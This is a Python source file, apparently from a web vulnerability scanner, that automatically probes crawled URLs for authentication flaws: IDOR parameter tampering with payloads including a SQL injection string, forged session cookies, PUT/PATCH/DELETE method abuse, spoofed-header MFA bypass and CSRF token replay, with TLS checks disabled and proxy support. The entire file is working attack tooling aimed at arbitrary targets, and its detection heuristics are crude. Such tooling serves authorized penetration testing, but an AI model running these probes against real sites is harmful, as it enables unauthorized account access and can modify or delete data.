# exploits/auth_exploit_tests.py

import aiohttp
import asyncio
import logging
from typing import Dict, List, Optional
from urllib.parse import urljoin, urlparse, parse_qsl

DEFAULT_HEADERS = {
    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/100.0.4896.127 Safari/537.36")
}

COMMON_AUTH_PARAMS = ["user_id", "uid", "account_id", "id", "session", "auth", "token", "role"]

IDOR_PAYLOADS = ["0", "1", "-1", "999999999", "' OR '1'='1"]

MFA_BYPASS_HEADERS = [
    {"X-Requested-With": "XMLHttpRequest"},
    {"Referer": "https://trusted.origin/"},
]

async def fetch_with_session(session: aiohttp.ClientSession, url: str, params: Dict[str,str], cookies: Dict[str, str] = None, headers: Dict[str,str] = None, method: str="GET", proxy: Optional[str] = None):
    try:
        if method.upper() == "POST":
            async with session.post(url, data=params, cookies=cookies, headers=headers or DEFAULT_HEADERS, proxy=proxy, ssl=False) as resp:
                text = await resp.text(errors="ignore")
                return {"status": resp.status, "text": text, "url": str(resp.url)}
        else:
            async with session.get(url, params=params, cookies=cookies, headers=headers or DEFAULT_HEADERS, proxy=proxy, ssl=False) as resp:
                text = await resp.text(errors="ignore")
                return {"status": resp.status, "text": text, "url": str(resp.url)}
    except Exception as e:
        logging.debug(f"[AUTH-EXPLOIT] Request error for {url} with method={method} params={params}: {e}")
        return {"status": 0, "text": "", "url": url}

async def test_idor(session: aiohttp.ClientSession, url: str, params: Dict[str, str], proxy: Optional[str] = None) -> List[Dict]:
    findings = []
    base_params = params.copy()
    for param in COMMON_AUTH_PARAMS:
        if param in base_params:
            for payload in IDOR_PAYLOADS:
                test_params = base_params.copy()
                test_params[param] = payload
                resp = await fetch_with_session(session, url, test_params, proxy=proxy)
                if resp["status"] == 200 and "unauthorized" not in resp["text"].lower():
                    findings.append({
                        "url": url,
                        "param": param,
                        "payload": payload,
                        "vuln": "Possible IDOR/Auth Bypass",
                        "response_url": resp["url"],
                        "response_status": resp["status"]
                    })
    return findings

async def test_session_hijack(session: aiohttp.ClientSession, url: str, cookies: Dict[str, str], proxy: Optional[str] = None) -> List[Dict]:
    findings = []
    for cookie_name, cookie_value in cookies.items():
        for test_value in ["", "123456", "abcdef", "admin", "test"]:
            fake_cookies = cookies.copy()
            fake_cookies[cookie_name] = test_value
            resp = await fetch_with_session(session, url, {}, cookies=fake_cookies, proxy=proxy)
            if resp["status"] == 200 and "logout" not in resp["text"].lower():
                findings.append({
                    "url": url,
                    "cookie_tested": cookie_name,
                    "test_value": test_value,
                    "vuln": "Possible Session Hijack/Fixation"
                })
    return findings

async def test_http_methods(session: aiohttp.ClientSession, url: str, params: Dict[str, str], proxy: Optional[str] = None):
    findings = []
    for method in ["PUT", "PATCH", "DELETE"]:
        resp = await fetch_with_session(session, url, params, method=method, proxy=proxy)
        if resp["status"] in [200, 204] and "unauthorized" not in resp["text"].lower():
            findings.append({"url": url, "method": method, "vuln": "Authorized HTTP Method Allowed"})
    return findings

async def test_mfa_bypass(session: aiohttp.ClientSession, url: str, params: Dict[str, str], proxy: Optional[str] = None):
    findings = []
    for hdr in MFA_BYPASS_HEADERS:
        resp = await fetch_with_session(session, url, params, headers=hdr, proxy=proxy)
        if resp["status"] == 200 and "mfa" not in resp["text"].lower():
            findings.append({"url": url, "headers": hdr, "vuln": "Potential MFA Bypass"})
    return findings

async def test_csrf(session: aiohttp.ClientSession, url: str, params: Dict[str, str], proxy: Optional[str] = None):
    # For demonstration, very basic: check if CSRF token present, try reuse
    findings = []
    resp1 = await fetch_with_session(session, url, params, proxy=proxy)
    if "csrf" in resp1["text"].lower():
        resp2 = await fetch_with_session(session, url, params, proxy=proxy)
        if resp1["text"] == resp2["text"]:
            findings.append({"url": url, "vuln": "Potential CSRF Token Replay"})
    return findings

async def run_auth_exploit_tests(base_url: str, discovered_links: List[str], proxy: Optional[str] = None) -> Dict[str, List[Dict]]:
    logging.info(f"[AUTH-EXPLOIT] Starting advanced auth exploit tests on {base_url}")
    results = {"idor": [], "session_hijack": [], "http_methods": [], "mfa_bypass": [], "csrf": []}

    async with aiohttp.ClientSession() as session:
        for url in discovered_links:
            parsed_url = urlparse(url)
            params = dict(parse_qsl(parsed_url.query))

            if params:
                idor_finds = await test_idor(session, url, params, proxy=proxy)
                results["idor"].extend(idor_finds)

                http_methods_finds = await test_http_methods(session, url, params, proxy=proxy)
                results["http_methods"].extend(http_methods_finds)

                mfa_finds = await test_mfa_bypass(session, url, params, proxy=proxy)
                results["mfa_bypass"].extend(mfa_finds)

                csrf_finds = await test_csrf(session, url, params, proxy=proxy)
                results["csrf"].extend(csrf_finds)

            fetch_resp = await session.get(url, proxy=proxy, ssl=False)
            cookies = {c.key: c.value for c in fetch_resp.cookies.values()}
            if cookies:
                session_hijack_finds = await test_session_hijack(session, url, cookies, proxy=proxy)
                results["session_hijack"].extend(session_hijack_finds)

    logging.info(f"[AUTH-EXPLOIT] Completed auth exploit tests")
    return results
